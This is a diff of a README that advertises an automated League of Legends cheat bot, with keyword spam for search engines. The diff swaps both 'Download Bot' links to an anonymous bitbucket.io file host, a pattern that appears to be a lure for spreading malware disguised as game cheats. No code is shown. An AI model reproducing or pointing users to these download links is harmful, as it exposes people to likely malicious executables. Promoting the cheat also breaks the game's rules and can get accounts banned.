@@ -6,7 +6,7 @@ League of Legends can be a blast… until it’s not. Whether you’re grinding 
 
 Play smart, automate smarter. Let your PC handle the grind while you chill.
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🤖 What Is the LoL Bot?
@@ -15,7 +15,7 @@ This is a **fully autonomous League of Legends bot** that plays matches for you�
 
 Whether you want it for 24/7 XP farming or background play while multitasking, the LoL Bot gets it done.
 
-[![Download Bot](https://i.ytimg.com/vi/DRCP43Y3B2U/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH8CYAC0AWKAgwIABABGFMgZSg3MA8=&amp;rs=AOn4CLD4JYGl5s8F2QjVRmzNJL1dunYzOQ)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Bot](https://i.ytimg.com/vi/DRCP43Y3B2U/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH8CYAC0AWKAgwIABABGFMgZSg3MA8=&amp;rs=AOn4CLD4JYGl5s8F2QjVRmzNJL1dunYzOQ)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔧 Key Bot Features
@@ -103,4 +103,5 @@ This isn’t cheating to win—it’s **cheating to not even play**.
 LoL bot, League of Legends automation, AFK bot League, auto lane LoL, XP farming bot, BE farm League, bot match hack LoL, skill casting bot, mission farm bot League, League auto accept
 
 ---
+
 
